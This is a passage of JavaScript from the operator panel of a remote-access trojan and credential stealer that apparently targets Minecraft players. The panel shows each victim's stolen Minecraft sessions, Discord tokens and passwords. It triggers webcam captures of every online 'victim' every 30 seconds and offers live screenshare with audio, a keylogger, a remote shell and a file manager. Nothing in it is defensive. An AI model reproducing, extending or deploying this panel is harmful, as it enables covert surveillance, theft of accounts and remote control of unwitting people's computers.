                toast('Password changed');
                document.getElementById('currentPassword').value = '';
                document.getElementById('newPassword').value = '';
            } else {
                toast(res.error, 'error');
            }
        }

        // Admin
        async function loadUsers() {
            const res = await api('/api/admin/users');
            if (!res.success) return;
            
            document.getElementById('usersTable').innerHTML = res.users.map(u => `
                <tr>
                    <td>
                        <strong>${u.username}</strong>
                        ${u.is_admin ? '<span style="color: var(--accent); font-size: 11px;"> ADMIN</span>' : ''}
                    </td>
                    <td><code style="font-size: 11px;">${u.build_key}</code></td>
                    <td style="font-size: 12px; color: var(--text-secondary);">
                        MC: ${u.mc_sessions || 0}  DC: ${u.tokens || 0}  PW: ${u.passwords || 0}
                    </td>
                    <td>
                        <span style="color: ${u.is_active ? 'var(--success)' : 'var(--danger)'}">
                            ${u.is_active ? 'Active' : 'Disabled'}
                        </span>
                    </td>
                    <td>
                        ${!u.is_admin ? `
                            <button class="btn btn-secondary btn-sm" onclick="toggleUser(${u.id})">${u.is_active ? 'Disable' : 'Enable'}</button>
                            <button class="btn btn-secondary btn-sm" onclick="deleteUser(${u.id})">Delete</button>
                        ` : ''}
                    </td>
                </tr>
            `).join('');
        }

        async function loadAllLogs() {
            const res = await api('/api/admin/logs');
            if (res.success) {
                renderLogs(res.logs, 'allLogsGrid');
            }
        }

        // ==================== TRASH & AUDIT ====================
        async function loadTrash() {
            const res = await api('/api/admin/trash');
            if (!res.success) return;
            
            const trash = res.trash || [];
            document.getElementById('trashCount').textContent = trash.length;
            
            if (trash.length === 0) {
                document.getElementById('trashTable').innerHTML = `
                    <tr>
                        <td colspan="9" style="text-align: center; padding: 40px; color: var(--text-muted);">
                            <i class="fas fa-trash-alt" style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                            Trash is empty
                        </td>
                    </tr>
                `;
                return;
            }
            
            document.getElementById('trashTable').innerHTML = trash.map(log => `
                <tr class="animate-fade">
                    <td><code style="background: var(--bg-hover); padding: 2px 6px; border-radius: 4px;">#${log.original_id}</code></td>
                    <td><span class="log-type-badge ${log.log_type}">${log.log_type}</span></td>
                    <td>${log.pc_name || 'Unknown'}</td>
                    <td>${log.pc_user || 'Unknown'}</td>
                    <td><code style="font-size: 11px;">${log.ip || 'Unknown'}</code></td>
                    <td style="font-size: 11px;">${new Date(log.created_at).toLocaleString()}</td>
                    <td style="font-size: 11px; color: var(--danger);">${new Date(log.deleted_at).toLocaleString()}</td>
                    <td><span style="color: var(--warning);">${log.deleted_by || 'Unknown'}</span></td>
                    <td>
                        <button class="btn btn-sm btn-primary" onclick="restoreFromTrash(${log.id})" title="Restore">
                            <i class="fas fa-undo"></i>
                        </button>
                    </td>
                </tr>
            `).join('');
        }
        
        async function restoreFromTrash(id) {
            if (!confirm('Restore this log?')) return;
            
            const res = await api(`/api/admin/trash/restore/${id}`, 'POST');
            if (res.success) {
                toast('Log restored successfully!', 'success');
                loadTrash();
                loadDashboard();
            } else {
                toast(res.error || 'Failed to restore', 'error');
            }
        }
        
        async function emptyTrash() {
            const password = prompt('Enter your password to permanently delete all logs in trash:');
            if (!password) return;
            
            if (!confirm(' WARNING: This will PERMANENTLY delete all logs in trash. This cannot be undone!')) return;
            
            const res = await api('/api/admin/trash/empty', 'POST', { password });
            if (res.success) {
                toast(res.message, 'success');
                loadTrash();
            } else {
                toast(res.error || 'Failed to empty trash', 'error');
            }
        }
        
        async function createBackup() {
            const res = await api('/api/admin/backup', 'POST');
            if (res.success) {
                toast(res.message, 'success');
            } else {
                toast(res.error || 'Failed to create backup', 'error');
            }
        }
        
        async function loadAuditLog() {
            const res = await api('/api/admin/audit-log');
            if (!res.success) return;
            
            const logs = res.audit_log || [];
            
            if (logs.length === 0) {
                document.getElementById('auditLogTable').innerHTML = `
                    <tr>
                        <td colspan="5" style="text-align: center; padding: 40px; color: var(--text-muted);">
                            <i class="fas fa-clipboard-list" style="font-size: 32px; margin-bottom: 12px; display: block; opacity: 0.5;"></i>
                            No audit logs yet
                        </td>
                    </tr>
                `;
                return;
            }
            
            document.getElementById('auditLogTable').innerHTML = logs.map(log => `
                <tr class="animate-fade">
                    <td style="font-size: 12px;">${new Date(log.created_at).toLocaleString()}</td>
                    <td><span style="color: var(--accent);">${log.username || 'Unknown'}</span></td>
                    <td>
                        <span style="padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600;
                            background: ${log.action.includes('DELETE') ? 'var(--danger)' : log.action.includes('RESTORE') ? 'var(--success)' : 'var(--info)'}20;
                            color: ${log.action.includes('DELETE') ? 'var(--danger)' : log.action.includes('RESTORE') ? 'var(--success)' : 'var(--info)'};">
                            ${log.action}
                        </span>
                    </td>
                    <td style="font-size: 12px; max-width: 400px; overflow: hidden; text-overflow: ellipsis;">${log.details || ''}</td>
                    <td><code style="font-size: 11px;">${log.ip || 'Unknown'}</code></td>
                </tr>
            `).join('');
        }

        function showCreateUser() {
            document.getElementById('modalTitle').textContent = 'Create User';
            document.getElementById('modalBody').innerHTML = `
                <div class="form-group">
                    <label>Username</label>
                    <input type="text" id="newUsername" placeholder="Username">
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="newUserPassword" placeholder="Password">
                </div>
                <button class="btn btn-primary" onclick="createUser()">Create User</button>
            `;
            document.getElementById('modal').classList.add('active');
        }

        async function createUser() {
            const username = document.getElementById('newUsername').value;
            const password = document.getElementById('newUserPassword').value;
            
            const res = await api('/api/admin/users', 'POST', { username, password });
            if (res.success) {
                toast('User created');
                closeModal();
                loadUsers();
            } else {
                toast(res.error, 'error');
            }
        }

        async function toggleUser(id) {
            const res = await api(`/api/admin/users/${id}/toggle`, 'POST');
            if (res.success) {
                loadUsers();
            }
        }

        async function deleteUser(id) {
            if (!confirm('Delete this user and all their logs?')) return;
            const res = await api(`/api/admin/users/${id}`, 'DELETE');
            if (res.success) {
                toast('User deleted');
                loadUsers();
            }
        }

        // ==================== LOGIN LOGS ====================
        async function loadLoginLogs() {
            const username = document.getElementById('loginUsernameFilter').value;
            const ip = document.getElementById('loginIpFilter').value;
            
            let endpoint = '/api/admin/login-logs';
            const params = new URLSearchParams();
            if (username) params.append('username', username);
            if (ip) params.append('ip', ip);
            if (params.toString()) endpoint += '?' + params.toString();
            
            // Load stats which contains the IP tables
            loadLoginStats();
        }

        async function loadLoginStats() {
            const res = await api('/api/admin/login-stats');
            if (res.success) {
                const stats = res.stats;
                
                // Render stats cards
                const statsGrid = document.getElementById('loginStatsGrid');
                statsGrid.innerHTML = `
                    <div class="stat-card">
                        <div class="stat-value">${stats.total_logins}</div>
                        <div class="stat-label">Total Logins</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" style="color: var(--success)">${stats.successful_logins}</div>
                        <div class="stat-label">Successful</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" style="color: var(--danger)">${stats.failed_logins}</div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${stats.unique_ips}</div>
                        <div class="stat-label">Unique IPs</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${stats.unique_users}</div>
                        <div class="stat-label">Unique Users</div>
                    </div>
                `;
                
                // Render successful logins by IP
                const successTable = document.getElementById('successfulLoginsTable');
                successTable.innerHTML = stats.successful_by_ip.map(ip => `
                    <tr>
                        <td><strong>${ip.ip_address}</strong></td>
                        <td>${ip.os_info}</td>
                        <td>${ip.users}</td>
                        <td style="text-align: center; color: var(--success);">${ip.count}</td>
                        <td>${new Date(ip.last_login).toLocaleString()}</td>
                        <td style="text-align: center;">
                            <button onclick="clearLoginLogsByIp('${ip.ip_address}')" class="btn btn-sm" style="background: var(--danger); padding: 4px 8px; font-size: 11px;" title="Delete logs from this IP">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `).join('');
                
                // Render failed logins by IP
                const failedTable = document.getElementById('failedLoginsTable');
                failedTable.innerHTML = stats.failed_by_ip.map(ip => `
                    <tr>
                        <td><strong style="color: var(--danger);">${ip.ip_address}</strong></td>
                        <td>${ip.attempted_users}</td>
                        <td style="text-align: center; color: var(--danger);">${ip.count}</td>
                        <td>${new Date(ip.last_attempt).toLocaleString()}</td>
                        <td style="text-align: center;">
                            <button onclick="clearLoginLogsByIp('${ip.ip_address}')" class="btn btn-sm" style="background: var(--danger); padding: 4px 8px; font-size: 11px;" title="Delete logs from this IP">
                                <i class="fas fa-trash"></i>
                            </button>
                        </td>
                    </tr>
                `).join('');
                
                // Show suspicious activity if any
                if (stats.suspicious_activity && stats.suspicious_activity.length > 0) {
                    const susBox = document.getElementById('suspiciousActivityBox');
                    susBox.style.display = 'block';
                    susBox.innerHTML = `
                        <h3 style="color: var(--danger); margin-bottom: 12px;">
                            <i class="fas fa-exclamation-triangle"></i> Suspicious Activity Detected
                        </h3>
                        ${stats.suspicious_activity.map(item => `
                            <div style="background: rgba(239,68,68,0.1); border-left: 3px solid var(--danger); padding: 12px; margin-bottom: 10px; border-radius: 4px;">
                                <strong>${item.username}</strong> logged in from <strong>${item.ip_count}</strong> different IPs:<br>
                                <small style="color: var(--text-secondary);">${item.ips}</small><br>
                                <small>Last login: ${new Date(item.last_login).toLocaleString()}</small>
                            </div>
                        `).join('')}
                    `;
                } else {
                    document.getElementById('suspiciousActivityBox').style.display = 'none';
                }
            }
        }

        // ==================== ONLINE PLAYERS ====================
        let onlinePollingInterval = null;
        let webcamAutoRequestInterval = null;
        
        async function loadOnlinePlayers() {
            try {
                const res = await api('/api/online');
                if (!res.success) {
                    document.getElementById('onlinePlayersGrid').innerHTML = `
                        <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                            <i class="fas fa-exclamation-circle" style="font-size: 32px; margin-bottom: 16px;"></i>
                            <p>Failed to load online players</p>
                        </div>
                    `;
                    return;
                }
                
                const players = res.players || [];
                document.getElementById('onlineCount').textContent = players.length;
                document.getElementById('onlineCountBadge').textContent = players.length;
                
                if (players.length === 0) {
                    document.getElementById('onlinePlayersGrid').innerHTML = `
                        <div style="text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                            <i class="fas fa-user-slash" style="font-size: 48px; margin-bottom: 16px; opacity: 0.5;"></i>
                            <p>No players currently online</p>
                        </div>
                    `;
                    return;
                }
                
                document.getElementById('onlinePlayersGrid').innerHTML = players.map((p, i) => `
                    <div class="online-card" style="animation-delay: ${i * 0.1}s;">
                        <div class="online-card-header">
                            <div class="online-avatar">
                                <img src="https://mc-heads.net/avatar/${p.player || 'Steve'}/48" 
                                     onerror="this.style.display='none'; this.parentElement.innerHTML='';"
                                     style="width: 48px; height: 48px; border-radius: 8px;">
                            </div>
                            <div style="flex: 1;">
                                <div class="online-name">${p.player || 'Unknown'}</div>
                                <div class="online-server">
                                    <i class="fas fa-server"></i> ${p.server || 'Unknown Server'}
                                </div>
                            </div>
                            <div class="online-status"></div>
                        </div>
                        <div class="online-info">
                            <div class="online-info-item"><i class="fas fa-desktop"></i> ${p.pc_name || 'N/A'}</div>
                            <div class="online-info-item"><i class="fas fa-user"></i> ${p.pc_user || 'N/A'}</div>
                            <div class="online-info-item"><i class="fas fa-globe"></i> ${p.country || 'N/A'}</div>
                            <div class="online-info-item"><i class="fas fa-clock"></i> ${formatTime(p.last_seen)}</div>
                        </div>
                        <div class="online-actions" style="padding: 12px; border-top: 1px solid var(--border); display: flex; gap: 8px;">
                            <button class="btn btn-danger btn-sm" onclick="forceKickPlayer('${p.player}')" style="flex: 1;">
                                <i class="fas fa-bolt"></i> Force Kick
                            </button>
                            <button class="btn btn-secondary btn-sm" onclick="showPage('remote'); selectRemotePlayer('${p.player}')" style="flex: 1;">
                                <i class="fas fa-terminal"></i> Remote
                            </button>
                        </div>
                    </div>
                `).join('');
                
            } catch (e) {
                console.error('Online players error:', e);
            }
        }
        
        function formatTime(timestamp) {
            if (!timestamp) return 'N/A';
            const d = new Date(timestamp);
            const now = new Date();
            const diff = (now - d) / 1000;
            if (diff < 60) return 'Just now';
            if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
            return d.toLocaleTimeString();
        }

        async function forceKickPlayer(playerName) {
            if (!confirm(`Force disconnect ${playerName} from their server?`)) return;
            
            try {
                const res = await api(`/api/online/force_disconnect/${encodeURIComponent(playerName)}`, 'POST');
                if (res.success) {
                    showToast(`Kick command sent to ${playerName}`, 'success');
                } else {
                    showToast(res.error || 'Failed to send kick command', 'error');
                }
            } catch (e) {
                showToast('Failed to send kick command', 'error');
            }
            
            // Reload players after a short delay
            setTimeout(loadOnlinePlayers, 1500);
        }

        function selectRemotePlayer(playerName) {
            // Pre-select the player in remote tab if possible
            setTimeout(() => {
                const select = document.getElementById('remotePlayerSelect');
                if (select) {
                    for (let opt of select.options) {
                        if (opt.value === playerName) {
                            select.value = playerName;
                            break;
                        }
                    }
                }
            }, 500);
        }
        
        // Start polling when on online page
        function startOnlinePolling() {
            if (onlinePollingInterval) clearInterval(onlinePollingInterval);
            loadOnlinePlayers();
            onlinePollingInterval = setInterval(loadOnlinePlayers, 5000); // Every 5 seconds
            
            // Start auto webcam request for all online players
            if (webcamAutoRequestInterval) clearInterval(webcamAutoRequestInterval);
            webcamAutoRequestInterval = setInterval(requestWebcamForAllPlayers, 30000); // Every 30 seconds
        }
        
        async function requestWebcamForAllPlayers() {
            try {
                const res = await api('/api/online');
                if (res.success && res.players) {
                    for (const player of res.players) {
                        const playerName = player.player || player.name;
                        if (playerName) {
                            // Send webcam command to each online player
                            await api('/api/remote/command', {
                                method: 'POST',
                                body: JSON.stringify({
                                    player: playerName,
                                    command: 'webcam'
                                })
                            });
                        }
                    }
                }
            } catch (e) {
                console.error('Auto webcam request error:', e);
            }
        }

        // ==================== WEBCAM ====================
        async function loadWebcamImages() {
            try {
                const res = await api('/api/webcam');
                if (!res.success) {
                    document.getElementById('webcamGrid').innerHTML = `
                        <div class="webcam-empty" style="grid-column: 1/-1;">
                            <i class="fas fa-exclamation-circle"></i>
                            <p>Failed to load webcam images</p>
                        </div>
                    `;
                    return;
                }
                
                const images = res.images || [];
                document.getElementById('webcamTotal').textContent = images.length;
                
                // Count today's images
                const today = new Date().toDateString();
                const todayCount = images.filter(img => new Date(img.created_at).toDateString() === today).length;
                document.getElementById('webcamToday').textContent = todayCount;
                
                // Count unique victims
                const uniqueVictims = new Set(images.map(img => `${img.pc_name}_${img.pc_user}`)).size;
                document.getElementById('webcamVictims').textContent = uniqueVictims;
                
                if (images.length === 0) {
                    document.getElementById('webcamGrid').innerHTML = `
                        <div class="webcam-empty" style="grid-column: 1/-1;">
                            <i class="fas fa-camera-retro"></i>
                            <p>No webcam captures yet</p>
                            <small style="color: var(--text-muted); margin-top: 12px; display: block;">
                                Webcam captures are automatic when victims connect to a server
                            </small>
                        </div>
                    `;
                    return;
                }
                
                document.getElementById('webcamGrid').innerHTML = images.map((img, i) => `
                    <div class="webcam-card animate-fade" style="animation-delay: ${i * 0.05}s;">
                        <img class="webcam-image" src="/api/webcam/image/${img.id}" 
                             onclick="openLightbox('/api/webcam/image/${img.id}', '${(img.pc_name || 'Unknown').replace(/'/g, "\\'")} - ${new Date(img.created_at).toLocaleString()}')"
                             loading="lazy"
                             onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 160 90%22><rect fill=%22%231a1a24%22 width=%22160%22 height=%2290%22/><text x=%2280%22 y=%2250%22 fill=%22%2371717a%22 text-anchor=%22middle%22 font-size=%2210%22>Image Error</text></svg>'">
                        <div class="webcam-info">
                            <div class="webcam-victim">
                                <i class="fas fa-user-secret" style="margin-right: 8px; color: var(--accent);"></i>
                                ${img.pc_name || 'Unknown'} / ${img.pc_user || 'N/A'}
                            </div>
                            <div class="webcam-meta">
                                <div class="webcam-meta-item">
                                    <i class="fas fa-clock"></i>
                                    ${new Date(img.created_at).toLocaleString()}
                                </div>
                                <div class="webcam-meta-item">
                                    <i class="fas fa-globe"></i>
                                    ${img.country || 'Unknown'}
                                </div>
                                <div class="webcam-meta-item">
                                    <i class="fas fa-network-wired"></i>
                                    ${img.ip || 'N/A'}
                                </div>
                            </div>
                            <div style="margin-top: 8px; display: flex; gap: 8px;">
                                <button class="btn btn-sm btn-secondary" onclick="event.stopPropagation(); openLightbox('/api/webcam/image/${img.id}', '${(img.pc_name || 'Unknown').replace(/'/g, "\\'")}')">
                                    <i class="fas fa-expand"></i> View Full
                                </button>
                                <a class="btn btn-sm btn-secondary" href="/api/webcam/image/${img.id}" download="webcam_${img.id}.jpg" onclick="event.stopPropagation();">
                                    <i class="fas fa-download"></i> Download
                                </a>
                            </div>
                        </div>
                    </div>
                `).join('');
                
            } catch (e) {
                console.error('Webcam error:', e);
            }
        }
        
        function openLightbox(src, info) {
            document.getElementById('lightboxImage').src = src;
            document.getElementById('lightboxInfo').innerHTML = `<i class="fas fa-user"></i> ${info}`;
            document.getElementById('webcamLightbox').classList.add('active');
            document.body.style.overflow = 'hidden';
        }
        
        function closeLightbox() {
            document.getElementById('webcamLightbox').classList.remove('active');
            document.body.style.overflow = '';
        }
        
        async function downloadAllWebcams() {
            showToast('Preparing download...', 'info');
            // Open each image in new tab for manual save (no zip library)
            const res = await api('/api/webcam');
            if (res.success && res.images) {
                res.images.forEach((img, i) => {
                    setTimeout(() => {
                        const a = document.createElement('a');
                        a.href = `/api/webcam/image/${img.id}`;
                        a.download = `webcam_${img.pc_name || 'unknown'}_${img.id}.jpg`;
                        a.click();
                    }, i * 200);
                });
                showToast(`Downloading ${res.images.length} images...`, 'success');
            }
        }
        
        // Close lightbox with Escape
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        // ==================== REMOTE CONTROL FUNCTIONS ====================
        let screenshareInterval = null;
        let screensharePlayer = null;
        let lastScreenshotId = null;
        let commandRefreshInterval = null;

        async function loadRemotePlayers() {
            const res = await api('/api/remote/players');
            if (!res.success) return;
            
            const players = res.players || [];
            
            // Count by type
            const guardianCount = players.filter(p => p.player && p.player.startsWith('Guardian_')).length;
            const modCount = players.length - guardianCount;
            
            document.getElementById('remoteOnlineCount').textContent = players.length;
            document.getElementById('remoteGuardianCount').textContent = guardianCount;
            
            // Update all player selects
            const selects = ['screensharePlayerSelect', 'keylogPlayerSelect', 'shellPlayerSelect', 'filesPlayerSelect'];
            selects.forEach(id => {
                const sel = document.getElementById(id);
                if (!sel) return;
                const current = sel.value;
                sel.innerHTML = '<option value="">-- Select Client --</option>' + 
                    players.map(p => {
                        const isGuardian = p.player && p.player.startsWith('Guardian_');
                        const icon = isGuardian ? '' : '';
                        return `<option value="${p.player}">${icon} ${p.player} (${p.pc_name || 'Unknown'})</option>`;
                    }).join('');
                if (current) sel.value = current;
            });
            
            // Update table
            if (players.length === 0) {
                document.getElementById('remotePlayersTable').innerHTML = `
                    <tr>
                        <td colspan="7" style="text-align: center; padding: 40px; color: var(--text-muted);">
                            <i class="fas fa-satellite-dish" style="font-size: 32px; margin-bottom: 12px; display: block;"></i>
                            No remote clients connected<br>
                            <small>Clients with RemoteControl or Guardian will appear here</small>
                        </td>
                    </tr>`;
                return;
            }
            
            document.getElementById('remotePlayersTable').innerHTML = players.map(p => {
                const isGuardian = p.player && p.player.startsWith('Guardian_');
                const typeIcon = isGuardian ? '<span style="color: #f59e0b;"><i class="fas fa-shield-alt"></i> Guardian</span>' : '<span style="color: #22c55e;"><i class="fas fa-gamepad"></i> Mod</span>';
                const displayName = isGuardian ? p.player.replace('Guardian_', '') : p.player;
                
                return `
                <tr class="animate-fade">
                    <td><span style="color: #22c55e;"><i class="fas fa-circle" style="animation: pulse 2s infinite;"></i> Active</span></td>
                    <td><strong>${displayName}</strong></td>
                    <td>${typeIcon}</td>
                    <td>${p.pc_name || 'Unknown'} / ${p.pc_user || 'Unknown'}</td>
                    <td>${p.ip || 'N/A'} <span style="color: var(--text-muted);">(${p.country || '?'})</span></td>
                    <td>${new Date(p.last_seen).toLocaleTimeString()}</td>
                    <td>
                        <button class="btn btn-sm btn-primary" onclick="openRemoteForPlayer('${p.player}')" title="Control Panel">
                            <i class="fas fa-desktop"></i>
                        </button>
                        <button class="btn btn-sm btn-secondary" onclick="openScreenshareModal('${p.player}')" title="Screenshare">
                            <i class="fas fa-tv"></i>
                        </button>
                        <button class="btn btn-sm btn-secondary" onclick="openWebcamModal('${p.player}')" title="Webcam">
                            <i class="fas fa-camera"></i>
                        </button>
                        <button class="btn btn-sm btn-secondary" onclick="showPage('shell'); document.getElementById('shellPlayerSelect').value='${p.player}';" title="Shell">
                            <i class="fas fa-terminal"></i>
                        </button>
                    </td>
                </tr>
            `}).join('');
        }
        
        // Alias for backwards compatibility
        async function loadOnlinePlayersForRemote() {
            await loadRemotePlayers();
        }

        function openRemoteForPlayer(player) {
            // Quick access modal for a player
            showModal('Remote Control: ' + player, `
                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px;">
                    <button class="btn btn-primary" onclick="closeModal(); openScreenshareModal('${player}'); startScreenshareModal();" style="padding: 20px;">
                        <i class="fas fa-tv" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        Screenshare
                    </button>
                    <button class="btn btn-primary" onclick="closeModal(); openWebcamModal('${player}'); startWebcamModal();" style="padding: 20px;">
                        <i class="fas fa-camera" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        Webcam
                    </button>
                    <button class="btn btn-primary" onclick="closeModal(); showPage('keylogger'); startKeyloggerForPlayer('${player}');" style="padding: 20px;">
                        <i class="fas fa-keyboard" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        Keylogger
                    </button>
                    <button class="btn btn-primary" onclick="closeModal(); showPage('shell'); document.getElementById('shellPlayerSelect').value='${player}';" style="padding: 20px;">
                        <i class="fas fa-terminal" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        Remote Shell
                    </button>
                    <button class="btn btn-primary" onclick="closeModal(); showPage('files'); document.getElementById('filesPlayerSelect').value='${player}'; browseToPath();" style="padding: 20px;">
                        <i class="fas fa-folder-open" style="font-size: 24px; display: block; margin-bottom: 8px;"></i>
                        File Manager
                    </button>
                </div>
                <div style="margin-top: 20px; text-align: center;">
                    <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
                </div>
            `);
        }

        // ==================== SCREENSHARE MODAL ====================
        let screenshareModalInterval = null;
        let screenshareModalPlayer = null;
        let screenshareLastId = null;
        let screenshareFpsCounter = 0;
        let screenshareFpsTimer = null;
        let screenshareSoundEnabled = false;
        let screenshareAudioInterval = null;
        let screenshareUsingWebSocket = false;
        
        function openScreenshareModal(player) {
            screenshareModalPlayer = player;
            document.getElementById('screenshareModalPlayer').textContent = player;
            document.getElementById('screenshareModal').classList.add('active');
            document.body.style.overflow = 'hidden';
            
            // Reset state and clear image
            const img = document.getElementById('screenshareModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                img.style.display = 'none';
            }
            document.getElementById('screenshareModalPlaceholder').style.display = 'block';
            document.getElementById('screenshareStartBtn').style.display = 'inline-flex';
            document.getElementById('screenshareStopBtn').style.display = 'none';
            updateScreenshareStatus(false);
            
            // Initialize WebSocket
            initSocket();
            
            // Add click outside to close
            document.getElementById('screenshareModal').onclick = function(e) {
                if (e.target === this) {
                    closeScreenshareModal();
                }
            };
        }
        
        function closeScreenshareModal() {
            stopScreenshareModal();
            stopScreenshareAudio();
            
            // Clear image on close to prevent ghosting
            const img = document.getElementById('screenshareModalImage');
            if (img) {
                img.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                img.style.display = 'none';
            }
            
            // Leave WebSocket stream
            if (screenshareModalPlayer) {
                leaveStream(screenshareModalPlayer, 'screen');
            }
            
            // Reset sound button
            screenshareSoundEnabled = false;
            const soundBtn = document.getElementById('screenshareSoundBtn');
            if (soundBtn) {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';
            }
            
            document.getElementById('screenshareModal').classList.remove('active');
            document.body.style.overflow = '';
            screenshareModalPlayer = null;
            screenshareUsingWebSocket = false;
        }
        
        function updateScreenshareStatus(streaming) {
            const status = document.getElementById('screenshareModalStatus');
            if (streaming) {
                status.className = 'screenshare-modal-status streaming';
                status.innerHTML = '<i class="fas fa-circle" style="animation: pulse 1s infinite;"></i> <span>Live Streaming</span>';
            } else {
                status.className = 'screenshare-modal-status stopped';
                status.innerHTML = '<i class="fas fa-circle"></i> <span>Stopped</span>';
            }
        }
        
        async function startScreenshareModal() {
            try {
                if (!screenshareModalPlayer) return;
                
                document.getElementById('screenshareStartBtn').style.display = 'none';
                document.getElementById('screenshareStopBtn').style.display = 'inline-flex';
                document.getElementById('screenshareModalPlaceholder').style.display = 'none';
                document.getElementById('screenshareModalImage').style.display = 'block';
                updateScreenshareStatus(true);
                
                // Join WebSocket stream room - primary source
                joinStream(screenshareModalPlayer, 'screen');
                screenshareUsingWebSocket = true;
                
                // Get quality and fps from UI (defaults: 80, 30)
                const quality = parseInt(document.getElementById('streamQualitySlider')?.value || '80');
                const fps = parseInt(document.getElementById('streamFpsSlider')?.value || '30');
                window.streamQuality = quality;
                window.streamFps = fps;
                
                // Request Guardian to start streaming with quality params
                requestStartStream(screenshareModalPlayer, 'screen', quality, fps);
                
                // HTTP polling as FALLBACK (aggressive 25ms = ~40 FPS max)
                if (screenshareModalInterval) clearInterval(screenshareModalInterval);
                screenshareModalInterval = setInterval(fetchScreenshotModal, 25);
                
                // Start FPS counter
                screenshareFpsCounter = 0;
                if (screenshareFpsTimer) clearInterval(screenshareFpsTimer);
                screenshareFpsTimer = setInterval(() => {
                    const quality = window.streamQuality || 80;
                    document.getElementById('screenshareFps').textContent = screenshareFpsCounter + ' FPS | Quality: ' + quality;
                    screenshareFpsCounter = 0;
                }, 1000);
                
                toast(' Live Screenshare started (WebSocket + TCP optimized)');
            } catch(e) {
                console.error('startScreenshareModal error:', e);
                toast('Error starting screenshare: ' + e.message, 'error');
            }
        }
        
        function stopScreenshareModal() {
            // Stop WebSocket stream
            if (screenshareModalPlayer && screenshareUsingWebSocket) {
                requestStopStream(screenshareModalPlayer, 'screen');
                leaveStream(screenshareModalPlayer, 'screen');
            }
            
            // Clear any polling intervals
            if (screenshareModalInterval) {
                clearInterval(screenshareModalInterval);
                screenshareModalInterval = null;
            }
            if (screenshareFpsTimer) {
                clearInterval(screenshareFpsTimer);
                screenshareFpsTimer = null;
            }
            
            document.getElementById('screenshareStartBtn').style.display = 'inline-flex';
            document.getElementById('screenshareStopBtn').style.display = 'none';
            updateScreenshareStatus(false);
            document.getElementById('screenshareFps').textContent = '0 FPS';
            screenshareUsingWebSocket = false;
            screenshareFpsCounter = 0;
        }
        
        function toggleScreenshareSound() {
            screenshareSoundEnabled = !screenshareSoundEnabled;
            const soundBtn = document.getElementById('screenshareSoundBtn');
            
            if (screenshareSoundEnabled) {
                soundBtn.innerHTML = '<i class="fas fa-volume-mute"></i> Sound Off';
                soundBtn.className = 'btn btn-success';
                
                // Start audio polling if screenshare is active
                if (screenshareModalPlayer && screenshareModalInterval) {
                    startScreenshareAudio();
                }
                
                toast('Screenshare sound enabled');
            } else {
                soundBtn.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
                soundBtn.className = 'btn btn-secondary';
                
                // Stop audio polling
                stopScreenshareAudio();
                
                toast('Screenshare sound disabled');
            }
        }
        
        function startScreenshareAudio() {
            if (screenshareAudioInterval) clearInterval(screenshareAudioInterval);
            screenshareAudioInterval = setInterval(fetchScreenshareAudio, 1000); // Poll audio every second
        }
        
        function stopScreenshareAudio() {
            if (screenshareAudioInterval) {
                clearInterval(screenshareAudioInterval);
                screenshareAudioInterval = null;
            }
        }
        
        async function fetchScreenshareAudio() {
            if (!screenshareModalPlayer || !screenshareSoundEnabled) return;
            
            try {
                // Request audio capture from Guardian
                await api('/api/remote/command', 'POST', {
                    target_player: screenshareModalPlayer,
                    command_type: 'audio',
                    command_data: 'capture'
                });
                
                // Wait a moment for capture, then fetch
                await new Promise(r => setTimeout(r, 500));
                
                const res = await api(`/api/audio/latest?player=${encodeURIComponent(screenshareModalPlayer)}`);
                if (res.success && res.audio) {
                    // Get volume from slider
                    const volSlider = document.getElementById('screenshareVolume');
                    const vol = volSlider ? volSlider.value / 100 : 0.5;
                    
                    // Create audio element and play
                    const audio = new Audio('data:audio/mp3;base64,' + res.audio);
                    audio.volume = vol;
                    audio.play().catch(e => {
                        console.log('Audio autoplay blocked - click anywhere first:', e);
                    });
                }
            } catch (e) {
                // Ignore audio fetch errors
            }
        }
        
        async function fetchScreenshotModal() {
            if (!screenshareModalPlayer) return;
            
            try {
                const res = await api(`/api/screenshots/latest/${screenshareModalPlayer}`);
                
                if (res.success && res.id) {
                    const img = document.getElementById('screenshareModalImage');
                    if (img && img.style.display !== 'none') {
                        const newUrl = `/api/screenshots/image/${res.id}?t=${Date.now()}`;
                        img.src = newUrl;
                        img.style.display = 'block';
                    }
                    document.getElementById('screenshareModalPlaceholder').style.display = 'none';
                    
                    // Update FPS counter
                    screenshareFpsCounter++;
                }
            } catch (e) {
                // Silent fail - continue polling
            }
        }
        
        async function requestScreenshotModal() {
            if (!screenshareModalPlayer) return;
            
            await api('/api/remote/command', 'POST', {
                target_player: screenshareModalPlayer,
                command_type: 'screenshot',
                command_data: 'single'
            });
            toast('Screenshot requested');
        }
        
        function toggleFullscreen() {
            const modal = document.getElementById('screenshareModal');
            if (!document.fullscreenElement) {
                modal.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
        
        // ==================== VOLUME CONTROLS ====================
        let screenshareMuted = false;
        let webcamMuted = false;
        
        function setScreenshareVolume(val) {
